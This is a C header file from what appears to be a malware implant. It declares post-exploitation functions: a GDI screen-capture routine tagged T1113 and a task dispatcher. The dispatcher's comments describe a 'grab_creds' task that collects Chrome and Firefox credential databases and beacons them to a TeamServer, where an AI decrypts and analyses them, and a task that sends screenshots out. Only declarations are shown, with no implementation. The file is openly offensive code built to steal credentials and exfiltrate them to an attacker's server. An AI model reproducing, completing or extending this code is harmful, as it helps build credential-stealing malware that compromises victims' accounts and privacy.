// include/postex.h
#pragma once
#include <windows.h>

// Mod 154: GDI screenshot (T1113)
BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize);

// Post-exploitation task dispatcher
// Supported tasks:
//   "grab_creds"  — collect Chrome/Firefox DB files, serialize to JSON,
//                    beacon_post to TeamServer → AI for decryption + analysis
//   "screenshot"  — capture screen, beacon_post BMP data
BOOL postex_run(LPCSTR taskName);
